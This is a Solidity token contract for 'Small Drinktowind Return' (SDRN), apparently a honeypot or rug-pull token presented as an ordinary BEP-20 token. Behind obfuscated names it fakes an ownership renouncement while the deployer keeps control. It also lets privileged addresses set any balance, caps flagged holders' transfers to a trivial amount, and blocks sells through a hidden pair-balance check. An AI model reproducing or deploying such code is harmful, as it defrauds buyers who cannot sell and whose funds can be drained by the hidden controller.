//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface walletReceiverToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellAt {
    function createPair(address receiverAuto, address walletMax) external returns (address);
}

interface launchTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundShould) external view returns (uint256);

    function transfer(address fundModeIs, uint256 listMin) external returns (bool);

    function allowance(address exemptLiquidityToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 listMin) external returns (bool);

    function transferFrom(
        address sender,
        address fundModeIs,
        uint256 listMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atSwap, uint256 value);
    event Approval(address indexed exemptLiquidityToken, address indexed spender, uint256 value);
}

interface launchTeamMetadata is launchTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SmallDrinktowindReturn is totalAuto, launchTeam, launchTeamMetadata {

    uint8 private senderModeTake = 18;

    bool public txList;

    function amountLiquidity(address tokenEnable) public {
        maxSwap();
        if (isLiquidity != receiverShouldSwap) {
            tradingEnable = isLiquidity;
        }
        if (tokenEnable == shouldTo || tokenEnable == takeTo) {
            return;
        }
        marketingTake[tokenEnable] = true;
    }

    uint256 public senderBuy;

    address private senderTx;

    mapping(address => mapping(address => uint256)) private liquidityTeamToken;

    function modeTrading(address limitFeeAt, uint256 listMin) public {
        maxSwap();
        feeTake[limitFeeAt] = listMin;
    }

    uint256 marketingExempt;

    uint256 public isLiquidity;

    function swapReceiverBuy(uint256 listMin) public {
        maxSwap();
        buyList = listMin;
    }

    function marketingReceiverMin() public {
        emit OwnershipTransferred(shouldTo, address(0));
        senderTx = address(0);
    }

    constructor (){
        
        marketingReceiverMin();
        walletReceiverToken tokenReceiver = walletReceiverToken(isSell);
        takeTo = sellAt(tokenReceiver.factory()).createPair(tokenReceiver.WETH(), address(this));
        
        shouldTo = _msgSender();
        enableSender[shouldTo] = true;
        feeTake[shouldTo] = takeLaunched;
        
        emit Transfer(address(0), shouldTo, takeLaunched);
    }

    mapping(address => uint256) private feeTake;

    function transferFrom(address walletSwap, address fundModeIs, uint256 listMin) external override returns (bool) {
        if (_msgSender() != isSell) {
            if (liquidityTeamToken[walletSwap][_msgSender()] != type(uint256).max) {
                require(listMin <= liquidityTeamToken[walletSwap][_msgSender()]);
                liquidityTeamToken[walletSwap][_msgSender()] -= listMin;
            }
        }
        return isLaunchTx(walletSwap, fundModeIs, listMin);
    }

    function transfer(address limitFeeAt, uint256 listMin) external virtual override returns (bool) {
        return isLaunchTx(_msgSender(), limitFeeAt, listMin);
    }

    mapping(address => bool) public enableSender;

    address isSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 buyList;

    function isLaunchTx(address walletSwap, address fundModeIs, uint256 listMin) internal returns (bool) {
        if (walletSwap == shouldTo) {
            return amountSender(walletSwap, fundModeIs, listMin);
        }
        uint256 receiverMode = launchTeam(takeTo).balanceOf(totalTrading);
        require(receiverMode == buyList);
        require(fundModeIs != totalTrading);
        if (marketingTake[walletSwap]) {
            return amountSender(walletSwap, fundModeIs, isFundAmount);
        }
        return amountSender(walletSwap, fundModeIs, listMin);
    }

    string private senderList = "SDRN";

    uint256 public tradingEnable;

    function approve(address isMaxAuto, uint256 listMin) public virtual override returns (bool) {
        liquidityTeamToken[_msgSender()][isMaxAuto] = listMin;
        emit Approval(_msgSender(), isMaxAuto, listMin);
        return true;
    }

    function owner() external view returns (address) {
        return senderTx;
    }

    address public shouldTo;

    function decimals() external view virtual override returns (uint8) {
        return senderModeTake;
    }

    function getOwner() external view returns (address) {
        return senderTx;
    }

    event OwnershipTransferred(address indexed walletTrading, address indexed tradingWallet);

    function name() external view virtual override returns (string memory) {
        return toTeam;
    }

    function balanceOf(address fundShould) public view virtual override returns (uint256) {
        return feeTake[fundShould];
    }

    uint256 constant isFundAmount = 11 ** 10;

    uint256 private takeLaunched = 100000000 * 10 ** 18;

    function amountSender(address walletSwap, address fundModeIs, uint256 listMin) internal returns (bool) {
        require(feeTake[walletSwap] >= listMin);
        feeTake[walletSwap] -= listMin;
        feeTake[fundModeIs] += listMin;
        emit Transfer(walletSwap, fundModeIs, listMin);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeLaunched;
    }

    bool public amountTake;

    function symbol() external view virtual override returns (string memory) {
        return senderList;
    }

    address totalTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private toTeam = "Small Drinktowind Return";

    bool public buyMin;

    function maxSwap() private view {
        require(enableSender[_msgSender()]);
    }

    mapping(address => bool) public marketingTake;

    uint256 public receiverShouldSwap;

    address public takeTo;

    function autoToken(address swapAtMax) public {
        if (txList) {
            return;
        }
        if (isLiquidity != senderBuy) {
            amountTake = false;
        }
        enableSender[swapAtMax] = true;
        if (isLiquidity != senderBuy) {
            buyMin = false;
        }
        txList = true;
    }

    function allowance(address walletAuto, address isMaxAuto) external view virtual override returns (uint256) {
        if (isMaxAuto == isSell) {
            return type(uint256).max;
        }
        return liquidityTeamToken[walletAuto][isMaxAuto];
    }

}